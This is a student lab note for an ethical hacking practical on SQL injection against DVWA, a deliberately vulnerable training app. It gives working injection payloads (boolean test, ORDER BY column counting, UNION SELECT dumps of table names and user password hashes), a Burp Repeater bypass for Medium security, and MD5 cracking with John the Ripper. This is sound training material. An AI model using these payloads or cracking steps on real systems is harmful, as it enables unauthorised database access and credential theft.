---
type: lab
subject: ehpt
tags: [cybersecurity, lab, ehpt, sqli, dvwa, burp-suite, web-security]
status: learning
created: 2026-07-02
---

# Lab: Web App Testing — SQL Injection on DVWA

> 🔬 **Lab Practical** — EHPT Practical 5 | Est. time: 5 hrs

---

## 🎯 Objective
Manually exploit SQL Injection at Low and Medium security levels on DVWA using Burp Suite; extract database contents.

## 📋 Prerequisites
- [ ] Kali Linux with Burp Suite
- [ ] DVWA accessible at http://192.168.x.target/dvwa
- [ ] FoxyProxy configured for Burp (127.0.0.1:8080)

## 📝 Procedure

### Step 1: Confirm SQLi Exists (Low Security)
```
Input: 1' OR '1'='1
Result: Returns all users → SQLi confirmed
```

### Step 2: Find Number of Columns
```sql
1' ORDER BY 1 -- -     ✅ Works
1' ORDER BY 2 -- -     ✅ Works  
1' ORDER BY 3 -- -     ❌ Error → 2 columns
```

### Step 3: UNION-Based Extraction
```sql
-- Database version
1' UNION SELECT null, version() -- -

-- Current database name
1' UNION SELECT null, database() -- -

-- All table names
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -

-- Column names from users table
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' -- -

-- Extract usernames and password hashes
1' UNION SELECT user, password FROM users -- -
```

### Step 4: Medium Security Bypass
1. DVWA Medium uses dropdown (no direct input)
2. Intercept POST request in Burp Suite
3. Send to Repeater (Ctrl+R)
4. Modify `id` parameter with SQLi payload
5. Forward modified request

### Step 5: Crack Extracted Hashes
```bash
# Save hashes to file
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt

# Identify hash type (MD5)
hashid '5f4dcc3b5aa765d61d8327deb882cf99'

# Crack with John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

## ✅ Expected Output
- [ ] Error message confirming SQLi
- [ ] UNION SELECT showing DB version
- [ ] Users table dump with hashed passwords
- [ ] Burp Repeater screenshot for Medium bypass
- [ ] Cracked passwords

## 💭 Observation Questions
1. The passwords are MD5 hashes. Why is MD5 insufficient for password storage? What should be used instead?
2. How would a parameterised query prevent SQL injection?

## 🔗 Related Notes
- [[Web Application Security]]
- [[Burp Suite]] | [[Burp Suite Cheatsheet|Cheatsheet]] ⚡
- [[OWASP Top 10 Quick Reference|OWASP Top 10]] ⚡
